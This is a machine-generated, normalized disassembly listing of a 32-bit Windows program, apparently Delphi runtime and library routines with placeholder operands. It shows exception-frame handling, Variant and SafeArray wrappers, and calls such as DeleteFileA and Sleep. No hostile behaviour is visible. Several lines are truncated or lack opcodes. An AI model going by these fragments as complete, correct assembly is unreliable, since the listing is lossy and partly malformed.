sub_406f5c
sub [ rw-data ] 0x1
retn
sub_407a4d
add eax 0xffffffd4
jmp sub_40d134
sub_407a55
add eax 0xffffffd4
jmp sub_40cfdc
sub_407a5d
add eax 0xffffffd4
jmp sub_40d078
sub_407a6f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405760
sub_407a79
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405774
sub_408328
call sub_408304
retn
sub_4083c0
push eax
call CloseHandle
retn
sub_408430
push ebx
mov ebx eax
mov eax ebx
call sub_4083c8
inc eax
setne al
pop ebx
retn
sub_408440
push ebx
mov ebx eax
mov eax ebx
call sub_404510
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_408620
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408634
push esi
mov esi eax
xchg edx eax
call sub_4028e0
mov eax esi
pop esi
retn
sub_408820
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404248
pop esi
pop ebx
retn
sub_408834
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026e4
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408848
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_4088e8
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402840
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_40890c
push ebx
mov ebx eax
mov eax ebx
call sub_404050
pop ebx
retn
sub_408c6f
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404050
pop eax
pop ebx
retn
sub_408f27
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_409082
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4093df
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4093df
sub_40949c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404510
mov edx esi
xor ecx ecx
call sub_409328
pop esi
pop ebx
retn
sub_409510
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404510
mov edx esi
mov cl 0x1
call sub_409328
pop esi
pop ebx
retn
sub_409b8a
jmp sub_4039d0
sub_409b91
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409c82
jmp sub_4039d0
sub_409c89
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a42d
jmp sub_4039d0
sub_40a434
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a4bc
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a460
pop ebp
retn 0x8
sub_40a601
jmp sub_4039d0
sub_40a608
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40aaab
jmp sub_4039d0
sub_40aab2
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40af97
jmp sub_4039d0
sub_40af9e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b049
jmp sub_4039d0
sub_40b050
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b0f3
jmp sub_4039d0
sub_40b0fa
pop esi
pop ecx
pop ebp
retn
sub_40b2d6
jmp sub_4039d0
sub_40b2dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b334
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b626
jmp sub_4039d0
sub_40b6f4
jmp sub_4039d0
sub_40b71c
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403248
sub_40b818
pop ebx
retn
sub_40b8b8
jmp sub_4039d0
sub_40b8bf
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b8c8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403a08
sub_40b8d5
retn
sub_40b8d8
push ebp
mov ebp esp
call sub_40b81c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b8c8
pop ebp
retn 0x4
sub_40b8f4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
retn
sub_40b98c
push ebx
mov ebx eax
mov eax ebx
call sub_40b90c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bb5f
jmp sub_4039d0
sub_40bb66
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bc2b
jmp sub_4039d0
sub_40bc32
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bc3c
call sub_40b4c8
mov eax 0x1
call sub_403fb4
sub_40bdc0
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40be99
jmp sub_4039d0
sub_40beb6
jmp sub_4039d0
sub_40bebd
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40bf68
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40becc
mov ecx eax
sub_40c154
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c174
push eax
call CharNextA
retn
sub_40c450
jmp sub_4039d0
sub_40c457
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c4c0
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c917
jmp sub_4039d0
sub_40c91e
pop ebx
mov esp ebp
pop ebp
retn
sub_40cae7
jmp sub_4039d0
sub_40caee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cb90
jmp sub_4039d0
sub_40cb97
pop ebx
mov esp ebp
pop ebp
retn
sub_40cb9c
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cb00
sub_40cbac
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cbc8
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_402704
pop ebx
retn
sub_40cbe8
mov edx [ eax ]
xor edx [ eax + 0x4 ]
xor edx [ eax + 0x8 ]
xor edx [ eax + 0xc ]
mov eax edx
retn
sub_40cbf8
mov edx [ eax ]
ror edx 0x5
xor edx [ eax + 0x4 ]
ror edx 0x5
xor edx [ eax + 0x8 ]
ror edx 0x5
xor edx [ eax + 0xc ]
mov eax edx
retn
sub_40cc10
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
retn
sub_40cd0c
call sub_40cc98
cmp eax [ rw-data ]
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
call sub_40cc10
sub_40cd90
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cd9c
xchg [ eax ] edx
mov eax edx
retn
sub_40cdfc
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40ce8c
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cfa4
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cfcc
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d247
jmp sub_4039d0
sub_40d24e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d2bc
jmp sub_4039d0
sub_40d2c3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2e1
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d2da
jmp sub_4039d0
sub_40d2e1
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d7a4
jmp sub_4039d0
sub_40d7ab
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d824
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d88a
jmp sub_4039d0
sub_40d891
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d8f6
jmp sub_4039d0
sub_40d8fd
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d962
jmp sub_4039d0
sub_40d969
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d9ce
jmp sub_4039d0
sub_40d9d5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40da3a
jmp sub_4039d0
sub_40da41
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dab9
jmp sub_4039d0
sub_40dac0
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40db2c
jmp sub_4039d0
sub_40db33
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40db9c
jmp sub_4039d0
sub_40dba3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dc10
jmp sub_4039d0
sub_40dc17
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40df9d
jmp sub_4039d0
sub_40dfa4
pop ebp
retn
sub_40dfa8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40dc6c
sub_40dfb9
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e5da
jmp sub_4039d0
sub_40e5e1
pop ecx
pop ebp
retn
sub_40e673
jmp sub_4039d0
sub_40e67a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e6ca
jmp sub_4039d0
sub_40e6d1
pop ecx
pop ebp
retn
sub_40e763
jmp sub_4039d0
sub_40e76a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e7ba
jmp sub_4039d0
sub_40e7c1
pop ecx
pop ebp
retn
sub_40ea09
jmp sub_4039d0
sub_40ea10
pop ebx
mov esp ebp
pop ebp
retn
sub_40eaa2
jmp sub_4039d0
sub_40eaa9
pop ecx
pop ebp
retn
sub_40eaac
push ebx
mov ebx eax
mov eax ebx
call sub_40ed44
mov [ ebx ] 0x1
pop ebx
retn
sub_40ed44
test [ eax ] 0xbfe8
jne r-xdata
call sub_40ecc8
retn
mov [ eax ] 0x0
retn
sub_40ed58
push eax
call sub_40ed44
pop eax
retn
sub_40efb8
call sub_40f06c
retn
sub_40f1d6
jmp sub_4039d0
sub_40f1dd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f281
jmp sub_4039d0
sub_40f288
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f2aa
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404748
retn
sub_40f2a3
jmp sub_4039d0
sub_40f2aa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f306
jmp sub_4039d0
sub_40f30d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f389
jmp sub_4039d0
sub_40f8cf
jmp sub_4039d0
sub_40f8d6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f969
jmp sub_4039d0
sub_40f970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f98d
lea eax [ ebp - 0x14 ]
call sub_404730
retn
sub_40f986
jmp sub_4039d0
sub_40f98d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f9ea
jmp sub_4039d0
sub_40f9f1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fa93
jmp sub_4039d0
sub_40fab0
jmp sub_4039d0
sub_40fab7
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410012
jmp sub_4039d0
sub_410019
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4100c4
push eax
call sub_40ed44
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_4100d8
push eax
call sub_40ed44
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_410150
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f06c
add esp 0x10
sub_4103fa
jmp sub_4039d0
sub_410401
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410444
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40ed44
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_41045c
mov edx 0x80020004
call sub_410444
retn
sub_41047c
jmp [ eax + 0x56080040 ]
sub_4104ed
jmp sub_4039d0
sub_4104f4
pop esi
pop ebx
pop ebp
retn
sub_4104f8
push ebp
mov ebp esp
call sub_4106b8
pop ebp
retn 0x4
sub_410584
push ebp
mov ebp esp
call sub_4106b8
pop ebp
retn 0x4
sub_410667
jmp sub_4039d0
sub_41066e
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403284
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035f0
sub_410690
xor eax eax
retn
sub_410694
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4106a8
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4106b0
call sub_40e590
retn
sub_4106b8
call sub_40e680
retn
sub_4106c0
call sub_40ea58
retn
sub_4106c8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4106dc
call sub_4106b8
retn
sub_4106e4
push ebp
mov ebp esp
call sub_4106c0
pop ebp
retn 0x8
sub_4106fc
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4107d8
jmp sub_4039d0
sub_4108a1
jmp sub_4039d0
sub_4108a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4108c5
lea eax [ ebp - 0x10 ]
call sub_404050
retn
sub_4108be
jmp sub_4039d0
sub_4108c5
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4108d0
call sub_40eaac
retn
sub_410947
jmp sub_4039d0
sub_41094e
pop ebp
retn
sub_4109f1
jmp sub_4039d0
sub_4109f8
pop ebp
retn
sub_410b21
jmp sub_4039d0
sub_410b28
pop ebp
retn
sub_410b2c
sub [ rw-data ] 0x1
retn
sub_410b60
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_410e38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_4040a4
pop esi
pop ebx
retn
sub_410ed4
jmp sub_4039d0
sub_410edb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_410fd6
jmp sub_4039d0
sub_410fdd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4111dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f06c
pop esi
pop ebx
retn
sub_41135e
jmp sub_4039d0
sub_411365
pop ebp
retn
sub_411368
sub [ rw-data ] 0x1
retn
sub_411395
jmp sub_4039d0
sub_41139c
pop ebp
retn
sub_4113a0
sub [ rw-data ] 0x1
retn
sub_411cad
add [ esp + 0x4 ] 0xfffffff8
jmp sub_414980
sub_412555
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_412967
add [ eax ] al
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_412a0c
0x4129
sub_412cf8
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_412e1c
mov eax [ eax + 0xc ]
call sub_414014
retn
sub_4130f3
jmp sub_4039d0
sub_4130fa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413100
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4141cc
test eax eax
setge al
pop esi
pop ebx
retn
sub_413403
jmp sub_4039d0
sub_41340a
mov esp ebp
pop ebp
retn
sub_4134d8
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4134e4
push ebx
mov ebx edx
mov edx ebx
call sub_4132f8
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_413058
sub_413590
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4136eb
jmp sub_4039d0
sub_4137bf
jmp sub_4039d0
sub_4137d0
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_41383c
jmp sub_4039d0
sub_413843
pop ebx
mov esp ebp
pop ebp
retn
sub_41388e
jmp sub_4039d0
sub_413895
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413921
jmp sub_4039d0
sub_413928
pop ebx
pop ebp
retn
sub_4139a2
jmp sub_4039d0
sub_4139a9
pop ebx
pop ebp
retn
sub_4139ee
jmp sub_4039d0
sub_4139f5
pop ebx
pop ebp
retn
sub_413a3f
jmp sub_4039d0
sub_413a46
pop esi
pop ebx
pop ebp
retn
sub_413a9a
jmp sub_4039d0
sub_413aa1
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413bce
jmp sub_4039d0
sub_413ca4
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_41430c
sub_413d94
jmp sub_4039d0
sub_413f1e
jmp sub_4039d0
sub_413f25
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413fbf
jmp sub_4039d0
sub_413fc6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413fe5
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_413fde
jmp sub_4039d0
sub_413fe5
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_414048
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_414368
xor edx edx
mov eax ebx
call sub_41432c
pop ebx
retn
sub_4140c0
mov eax [ ebp + 0x4 ]
retn
sub_4140f6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_414144
jmp sub_4039d0
sub_41414b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414150
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_414168
xor edx edx
call sub_414170
retn
sub_414258
mov edx [ eax + 0x8 ]
dec edx
call sub_414170
retn
sub_4143d8
retn
sub_414492
jmp sub_4039d0
sub_414499
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035f0
sub_414528
jmp sub_4039d0
sub_41452f
pop ebx
pop ecx
pop ebp
retn
sub_414534
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41458b
jmp sub_4039d0
sub_414592
pop ebx
pop ecx
pop ebp
retn
sub_414598
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4145d4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
retn
sub_4145ec
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_4146c7
retn
sub_41476c
test edx edx
je r-xdata
xor edx edx
call sub_414780
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_414836
jmp sub_4039d0
sub_41483d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414850
xchg edx eax
call sub_414780
retn
sub_414858
retn
sub_4148f1
jmp sub_4039d0
sub_4148f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414ab5
jmp sub_4039d0
sub_414abc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414b50
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_4141cc
retn
sub_414c25
jmp sub_4039d0
sub_414c2c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414c70
xor edx edx
call sub_414b2c
retn
sub_414dde
jmp sub_4039d0
sub_414df8
inc [ eax + 0xc ]
retn
sub_414dfc
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_414e66
jmp sub_4039d0
sub_414e74
dec [ eax + 0xc ]
call sub_414dfc
retn
sub_414e80
xor eax eax
retn
sub_414e84
push ebx
mov ebx ecx
mov eax ebx
call sub_404050
pop ebx
retn
sub_414eb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414170
pop esi
pop ebx
retn
sub_414f7a
jmp sub_4039d0
sub_414f81
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415091
jmp sub_4039d0
sub_41516c
retn
sub_415170
retn
sub_415174
retn
sub_415178
retn
sub_4151e4
mov eax [ eax + 0x18 ]
retn
sub_4152ea
jmp sub_4039d0
sub_4152f1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41530e
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_415307
jmp sub_4039d0
sub_41530e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415398
jmp sub_4039d0
sub_4153b0
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41546c
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_415515
jmp sub_4039d0
sub_41551c
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415528
mov eax [ ebp + 0x4 ]
retn
sub_41555e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4155ac
jmp sub_4039d0
sub_4155b3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415672
jmp sub_4039d0
sub_415679
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41569b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404074
retn
sub_415694
jmp sub_4039d0
sub_41569b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4156a4
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4156ac
xor eax eax
retn
sub_4156f5
jmp sub_4039d0
sub_4156fc
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41580f
jmp sub_4039d0
sub_415816
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4158ab
jmp sub_4039d0
sub_4158b2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415930
jmp sub_4039d0
sub_415937
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415a07
jmp sub_4039d0
sub_415a0e
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415ac4
jmp sub_4039d0
sub_415acb
pop esi
pop ecx
pop ebp
retn
sub_415b50
jmp sub_4039d0
sub_415b57
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415b74
lea eax [ ebp - 0x8 ]
call sub_404050
retn
sub_415b6d
jmp sub_4039d0
sub_415b74
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415c00
jmp sub_4039d0
sub_415c1d
jmp sub_4039d0
sub_415c24
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415c60
retn
sub_415ce3
jmp sub_4039d0
sub_415cea
mov eax [ ebp - 0x8 ]
call sub_418824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415d0f
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_415d08
jmp sub_4039d0
sub_415d0f
mov esp ebp
pop ebp
retn
sub_415d5f
jmp sub_4039d0
sub_415d66
pop esi
pop ecx
pop ebp
retn
sub_415db9
jmp sub_4039d0
sub_415dc0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415dc8
retn
sub_415e43
jmp sub_4039d0
sub_415e4a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415ee7
jmp sub_4039d0
sub_415eee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f0b
lea eax [ ebp - 0x8 ]
call sub_404050
retn
sub_415f04
jmp sub_4039d0
sub_415f0b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415f10
retn
sub_415f8a
jmp sub_4039d0
sub_415f91
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415f98
mov eax edx
mov edx ecx
call sub_407da4
retn
sub_415fa4
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_415fbc
sub_416034
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_4160a4
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_4160c0
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4162b4
mov eax [ eax + 0x18 ]
retn
sub_4162b8
mov eax [ eax + 0x14 ]
retn
sub_416354
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_416560
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_402724
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41659c
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_4165b4
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_4165c8
mov edx sub_4165b4
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_416610
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407da4
retn
mov eax edx
mov edx ecx
call sub_407d6c
retn
sub_4166ac
retn
sub_4169a4
jmp sub_4039d0
sub_4169ab
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_416a0c
jmp sub_4039d0
sub_416a13
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416a58
mov eax [ eax + 0x4 ]
call sub_408330
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_416a68
mov eax [ eax + 0x4 ]
call sub_40835c
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_416aa4
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_416c4d
jmp sub_4039d0
sub_416cac
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
